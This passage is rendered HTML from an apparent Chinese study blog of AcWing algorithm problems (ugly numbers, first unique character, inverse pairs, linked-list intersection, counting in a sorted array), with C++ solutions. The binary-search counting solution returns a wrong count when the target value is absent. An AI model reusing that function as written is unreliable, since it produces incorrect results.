class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span>。</p><p>求第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个丑数的值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入：5输出：5</code></pre><p><strong>注意</strong>：习惯上我们把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 当做第一个丑数。</p><h3 id="题解-8">题解</h3><p>考虑丑数集为S = 1, 2, 3, 4, 5, 6, 8, 9, 10, …</p><ol><li>包含因子2的S子集为S1, 则S1 / 2 = S （S1中元素因子只包含2、3、5, 除以一个2后只包含2、3、5, 就是一个丑集）</li><li>包含因子3的S子集为S2, 则S2 / 3 = S</li><li>包含因子5的S子集为S3, 则S3 / 5 = S</li></ol><p>要求出S, 只需要对S1, S2, S3进行多路归并(注意去重)即可<br>利用S1 / 2 = S等性质, 我们不需要真的把S1, S2, S3求出来, 而可以这样做:<br>设置3个指针i,j和k, 2 * q[i], 3 * q[j]和5 * q[k]指向的就是S1, S2和S3中的最小元素。</p><blockquote><p>吐槽：这一般没做的人谁能想到？</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getUglyNumber</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (--n) &#123;  <span class="comment">// n-1次循环</span></span><br><span class="line">      <span class="type">int</span> t = <span class="built_in">min</span>(<span class="number">2</span> * q[i], <span class="built_in">min</span>(<span class="number">3</span> * q[j], <span class="number">5</span> * q[k]));</span><br><span class="line">      q.<span class="built_in">push_back</span>(t);</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">2</span> * q[i] == t) i++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">3</span> * q[j] == t) j++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">5</span> * q[k] == t) k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> q.<span class="built_in">back</span>();   <span class="comment">// 不能用q[n - 1], 此时n已为0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="字符串中第一个只出现一次的字符"><a href="https://www.acwing.com/problem/content/59/">字符串中第一个只出现一次的字符</a></h2><p>在字符串中找出第一个只出现一次的字符。</p><p>如输入<code>&quot;abaccdeff&quot;</code>，则输出<code>b</code>。</p><p>如果字符串中不存在只出现一次的字符，返回 <code>#</code> 字符。</p><p><strong>数据范围</strong></p><p>输入字符串长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例：</strong></p><pre><code>输入：&quot;abaccdeff&quot;输出：'b'</code></pre><h3 id="hash表统计">hash表统计</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">char</span> <span class="title">firstNotRepeatingChar</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: s) hash[x]++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: s) &#123;</span><br><span class="line">      <span class="keyword">if</span> (hash[x] == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="字符流中第一个只出现一次的字符"><a href="https://www.acwing.com/problem/content/60/">字符流中第一个只出现一次的字符</a></h2><p>请实现一个函数用来找出字符流中第一个只出现一次的字符。</p><p>例如，当从字符流中只读出前两个字符 <code>go</code> 时，第一个只出现一次的字符是 <code>g</code>。</p><p>当从该字符流中读出前六个字符 <code>google</code> 时，第一个只出现一次的字符是 <code>l</code>。</p><p>如果当前字符流没有存在出现一次的字符，返回 <code>#</code> 字符。</p><p><strong>数据范围</strong></p><p>字符流读入字符数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：&quot;google&quot;输出：&quot;ggg#ll&quot;解释：每当字符流读入一个字符，就进行一次判断并输出当前的第一个只出现一次的字符。</code></pre><h3 id="双指针-队列-hash表统计">双指针(队列) + hash表统计</h3><p>时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">  queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// void insert(char ch)&#123;</span></span><br><span class="line">  <span class="comment">//   q.push(ch);</span></span><br><span class="line">  <span class="comment">//   hash[ch]++;</span></span><br><span class="line">  <span class="comment">//   // 只是简单的pop, 没有hash对应数量的变化</span></span><br><span class="line">  <span class="comment">//   while (q.size() &amp;&amp; hash[q.front()] &gt; 1) q.pop();</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//Insert one char from stringstream</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> ch)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 优化: 只有insert导致重复出现才需要pop队头; 只有出现重复才有必要push(否则一定会被pop)</span></span><br><span class="line">    <span class="keyword">if</span> (++hash[ch] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; hash[q.<span class="built_in">front</span>()] &gt; <span class="number">1</span>) q.<span class="built_in">pop</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      q.<span class="built_in">push</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//return the first appearence once char in current stringstream</span></span><br><span class="line">  <span class="function"><span class="type">char</span> <span class="title">firstAppearingOnce</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> q.<span class="built_in">front</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组中的逆序对★"><a href="https://www.acwing.com/problem/content/61/">数组中的逆序对★</a></h2><p>在数组中的两个数字如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。</p><p>输入一个数组，求出这个数组中的逆序对的总数。</p><p><strong>数据范围</strong></p><p>给定数组的长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,2,3,4,5,6,0]输出：6</code></pre><h3 id="基于归并排序的统计">基于归并排序的统计</h3><p>通过归并排序, 时间复杂度由暴力做法的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 减小到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⋅</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums_;</span><br><span class="line">  <span class="type">int</span> tmp[<span class="number">110</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">merge</span>(l, mid) + <span class="built_in">merge</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i = l, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums_[i] &lt;= nums_[j]) &#123;  <span class="comment">// 逆序对这必须 &lt;=</span></span><br><span class="line">        tmp[k++] = nums_[i++];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tmp[k++] = nums_[j++];</span><br><span class="line">        res += mid - i + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid) tmp[k++] = nums_[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r) tmp[k++] = nums_[j++];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) nums_[i] = tmp[j];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">inversePairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    nums_ = nums;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">merge</span>(<span class="number">0</span>, nums_.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="两个链表的第一个公共结点"><a href="https://www.acwing.com/problem/content/62/">两个链表的第一个公共结点</a></h2><p>输入两个链表，找出它们的第一个公共结点。</p><p>当不存在公共节点时，返回空节点。</p><p><strong>数据范围</strong></p><p>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,2000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2000</span><span class="mclose">]</span></span></span></span>。<br>保证两个链表不完全相同，即两链表的头结点不相同。</p><p><strong>样例</strong></p><pre><code>给出两个链表如下所示：A：        a1 → a2                   ↘                     c1 → c2 → c3                   ↗            B:     b1 → b2 → b3输出第一个公共节点c1</code></pre><h3 id="题解-9">题解</h3><p>有2种情况:</p><ol><li><p>存在公共节点, 设a1到公共节点距离为a, b1到公共节点距离为b, 公共段长度为c<br>那么让两指针分别从a1, b1出发, 到达列表结尾处后分别从b1和a1重新出发<br>则它们一定会在公共节点处相逢(走的路程 a + c + b = b + c + a)</p></li><li><p>不存在公共节点, 设a1和b1到各自链表结尾的距离分别为a和b<br>则使用1中方法, 它们一定也会同时到达结尾(走的路程为 a + b = b + a)</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">findFirstCommonNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> p = headA, q = headB;</span><br><span class="line">    <span class="keyword">while</span> (p != q) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = headB;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        q = headA;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数字在排序数组中出现的次数"><a href="https://www.acwing.com/problem/content/63/">数字在排序数组中出现的次数</a></h2><p>统计一个数字在排序数组中出现的次数。</p><p>例如输入排序数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1, 2, 3, 3, 3, 3, 4, 5]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">]</span></span></span></span> 和数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>，由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 在这个数组中出现了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 次，因此输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1, 2, 3, 3, 3, 3, 4, 5] ,  3输出：4</code></pre><h3 id="题解-10">题解</h3><blockquote><p>使用二分法找到连续区间的上边界和下边界，这样才能保证时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>在工程中可以使用<code>int num = count(nums.begin(), nums.end(), k);</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getNumberOfK</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums , <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &gt;= k) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> begin = l;</span><br><span class="line">    </span><br><span class="line">    l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &lt;= k) &#123;</span><br><span class="line">        l = mid;  <span class="comment">// 写到这马上给mid加1</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        r = mid - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> l - begin + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-6">Week 6</h1><h2 id="0到n-1中缺失的数字"><a href="https://www.acwing.com/problem/content/64/">0到n-1中缺失的数字</a></h2><p>一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 之内。</p><p>在范围 